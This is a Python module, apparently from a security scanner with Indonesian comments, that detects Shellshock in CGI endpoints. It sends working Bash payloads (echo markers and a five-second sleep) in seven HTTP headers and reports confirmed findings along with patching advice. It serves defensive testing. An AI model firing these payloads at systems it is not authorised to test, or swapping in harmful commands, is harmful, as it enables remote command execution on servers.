"""Shellshock (CVE-2014-6271 / CVE-2014-7169) scanner.

Bug Bash klasik: variabel environment yang nilainya berbentuk fungsi
shell di-evaluasi langsung saat shell dijalankan dari CGI. Server CGI
yang masih memakai bash sebagai handler -> attacker dapat menjalankan
perintah shell apa pun via header HTTP (User-Agent, Referer, Cookie,
Authorization, dst.).

Strategi probe (3 vector eksekusi sebelum lapor sebagai konfirmed):

    Vector 1 - **Echo marker**:
        () { :;}; /bin/echo CYBERLOKA-SS-<random>
        Bila marker echo muncul di header response (X-Cyberloka-Echo)
        atau body -> RCE confirmed.

    Vector 2 - **Out-of-line via header**:
        () { :;}; /bin/echo \"X-Cyberloka: hit\" >&2
        Beberapa CGI mengirim stderr ke header response.

    Vector 3 - **Time-based**:
        () { :;}; /bin/sleep 5
        Bandingkan waktu response. Jika delta > 4 detik konsisten ->
        eksekusi sukses.

Validasi finding:
    * Setidaknya **satu vector** menghasilkan marker yang terlihat (echo)
      atau **vector time-based** memperlihatkan delta nyata.
    * Untuk konfirmasi tinggi, jalankan probe yang sama 2x untuk hindari
      false-positive akibat random latency.

Probe target:
    * Endpoint CGI klasik: /cgi-bin/test.cgi, /cgi-bin/test.sh, /cgi-bin/,
      /cgi-bin/printenv.pl, /cgi-bin/env.cgi, /cgi-bin/status.cgi.
    * Crawler-discovered URL yang mengandung /cgi-bin/ atau .cgi/.sh.

Header injection:
    User-Agent, Referer, Cookie, Accept-Language, Authorization, X-Forwarded-For,
    X-Real-IP. Dipakai SEMUA per probe untuk maksimalkan hit rate karena
    server berbeda parse env dari header berbeda.
"""
from __future__ import annotations

import random
import re
import string
import time
from urllib.parse import urljoin

from cyberloka.core import Finding, HttpClient, Severity, Target
from cyberloka.core.config import ScanConfig
from cyberloka.core.util import truncate
from cyberloka.recon.crawler import get_state

CGI_PATHS = [
    "cgi-bin/test.cgi", "cgi-bin/test.sh", "cgi-bin/",
    "cgi-bin/printenv.pl", "cgi-bin/printenv", "cgi-bin/env.cgi",
    "cgi-bin/status.cgi", "cgi-bin/index.cgi", "cgi-bin/login.cgi",
    "cgi-bin/admin.cgi", "cgi-bin/php-cgi", "cgi-bin/php.cgi",
    "cgi-bin/bash.cgi", "cgi-bin/test", "scripts/test.cgi",
    "cgi/test.cgi", "test.cgi", "test.sh",
]

INJECT_HEADERS = (
    "User-Agent", "Referer", "Cookie", "Accept-Language",
    "Authorization", "X-Forwarded-For", "X-Real-IP",
)


def _marker() -> str:
    return "CYBERLOKA-SS-" + "".join(
        random.choices(string.ascii_letters + string.digits, k=10)
    )


def _candidates(target: Target, config: ScanConfig) -> list[str]:
    """Daftar URL yang masuk akal untuk probe shellshock."""
    base = target.origin + "/"
    out: list[str] = [urljoin(base, p) for p in CGI_PATHS]

    state = get_state(config)
    if state:
        for u in state.urls:
            low = u.lower()
            if "/cgi-bin/" in low or low.endswith((".cgi", ".sh", ".pl")):
                if u not in out:
                    out.append(u)
    return out[:24]


def _build_headers(payload: str) -> dict[str, str]:
    """Inject payload yang sama di semua header attack."""
    return {h: payload for h in INJECT_HEADERS}


def _probe_echo(client: HttpClient, url: str) -> tuple[bool, str, str]:
    """Vector 1: echo marker. Return (hit, marker, evidence)."""
    marker = _marker()
    payload = f"() {{ :;}}; /bin/echo {marker}"
    headers = _build_headers(payload)
    r = client.get(url, headers=headers, allow_redirects=False)
    if r is None:
        return False, marker, ""
    body = r.text or ""
    header_blob = " | ".join(f"{k}: {v}" for k, v in r.headers.items())
    if marker in body:
        return True, marker, f"marker echo di body (HTTP {r.status_code})"
    if marker in header_blob:
        return True, marker, f"marker echo di header response"
    return False, marker, ""


def _probe_header_echo(client: HttpClient, url: str) -> tuple[bool, str, str]:
    """Vector 2: echo via header (untuk CGI yang flush stderr ke header)."""
    marker = _marker()
    payload = f'() {{ :;}}; /bin/echo "X-Cyberloka-Hit: {marker}"'
    headers = _build_headers(payload)
    r = client.get(url, headers=headers, allow_redirects=False)
    if r is None:
        return False, marker, ""
    if r.headers.get("X-Cyberloka-Hit", "").strip() == marker:
        return True, marker, "header X-Cyberloka-Hit echoed back"
    return False, marker, ""


def _probe_time(client: HttpClient, url: str,
                threshold_sec: float = 4.0) -> tuple[bool, str, str]:
    """Vector 3: time-based. Bandingkan baseline vs sleep."""
    # Baseline
    headers_clean = {h: f"cyberloka-baseline-{random.randint(0, 9999)}"
                     for h in INJECT_HEADERS}
    t0 = time.monotonic()
    r0 = client.get(url, headers=headers_clean, allow_redirects=False)
    base_dt = time.monotonic() - t0
    if r0 is None:
        return False, "", ""
    # Sleep injection
    payload = "() { :;}; /bin/sleep 5"
    headers = _build_headers(payload)
    t1 = time.monotonic()
    r1 = client.get(url, headers=headers, allow_redirects=False)
    sleep_dt = time.monotonic() - t1
    if r1 is None:
        return False, "", ""
    delta = sleep_dt - base_dt
    if delta < threshold_sec:
        return False, "", ""
    # Konfirmasi: ulang sekali untuk hindari noise
    t2 = time.monotonic()
    r2 = client.get(url, headers=headers, allow_redirects=False)
    sleep_dt2 = time.monotonic() - t2
    if r2 is None:
        return False, "", ""
    if (sleep_dt2 - base_dt) < threshold_sec:
        return False, "", ""
    return True, "time-based", (
        f"baseline={base_dt:.2f}s, sleep#1={sleep_dt:.2f}s, "
        f"sleep#2={sleep_dt2:.2f}s, threshold={threshold_sec}s"
    )


def run(target: Target, config: ScanConfig) -> list[Finding]:
    findings: list[Finding] = []
    seen_urls: set[str] = set()
    client = HttpClient(config)
    try:
        for url in _candidates(target, config):
            if url in seen_urls:
                continue
            seen_urls.add(url)

            # Pre-flight: skip kalau endpoint langsung 404 di GET tanpa payload
            head = client.head(url, allow_redirects=False)
            if head is None:
                continue
            if head.status_code in (404, 410):
                continue

            # Vector 1
            hit, marker, ev = _probe_echo(client, url)
            if hit:
                findings.append(Finding(
                    module="shellshock",
                    title="Shellshock RCE confirmed (echo marker reflected)",
                    severity=Severity.CRITICAL,
                    description=(
                        "Server menjalankan payload Bash yang dikirim via "
                        "header HTTP. Marker unik kami muncul di response "
                        "yang berarti shell server mengeksekusi `/bin/echo`. "
                        "Attacker dapat menjalankan perintah arbitrer di "
                        "level user web-server."
                    ),
                    target=url,
                    evidence=truncate(f"marker={marker} hit_at={ev}", 240),
                    cwe="CWE-78",
                    confidence="confirmed",
                    remediation=(
                        "Update Bash ke 4.3+ (semua patch CVE-2014-6271, "
                        "6277, 6278, 7169, 7186, 7187 diterapkan). "
                        "Kemudian: ganti CGI handler ke FastCGI/PHP-FPM/"
                        "language runtime native (jangan lewat shell). "
                        "Audit aplikasi yang masih spawn Bash subprocess "
                        "dari header HTTP."
                    ),
                    references=[
                        "https://nvd.nist.gov/vuln/detail/CVE-2014-6271",
                        "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-7169",
                    ],
                    extra={"reverify": {"marker": marker, "in_body": True}},
                ))
                continue  # cukup untuk endpoint ini

            # Vector 2
            hit, marker, ev = _probe_header_echo(client, url)
            if hit:
                findings.append(Finding(
                    module="shellshock",
                    title="Shellshock RCE confirmed (header echo)",
                    severity=Severity.CRITICAL,
                    description=(
                        "Server membalas header response yang berisi marker "
                        "yang diset oleh payload shell. Konfirmasi RCE level "
                        "user web-server."
                    ),
                    target=url,
                    evidence=truncate(f"marker={marker} hit_at={ev}", 240),
                    cwe="CWE-78",
                    confidence="confirmed",
                    remediation=(
                        "Sama dengan Vector 1: patch Bash + ganti handler "
                        "CGI."
                    ),
                    references=["https://nvd.nist.gov/vuln/detail/CVE-2014-6271"],
                    extra={"reverify": {"marker": "X-Cyberloka-Hit"}},
                ))
                continue

            # Vector 3 (mahal, jalankan terakhir & hanya di endpoint yang
            # tampaknya CGI)
            if not ("/cgi-bin/" in url or url.endswith((".cgi", ".sh"))):
                continue
            hit, _marker, ev = _probe_time(client, url)
            if hit:
                findings.append(Finding(
                    module="shellshock",
                    title="Shellshock RCE confirmed (time-based, sleep delay)",
                    severity=Severity.CRITICAL,
                    description=(
                        "Payload `sleep 5` yang dikirim via header HTTP "
                        "menyebabkan response delay konsisten 5 detik dua "
                        "kali berturut-turut, sedangkan baseline cepat. "
                        "Indikasi kuat eksekusi shell di server."
                    ),
                    target=url,
                    evidence=ev,
                    cwe="CWE-78",
                    confidence="firm",
                    remediation="Sama dengan Vector 1.",
                    references=["https://nvd.nist.gov/vuln/detail/CVE-2014-6271"],
                ))
    finally:
        client.close()
    return findings
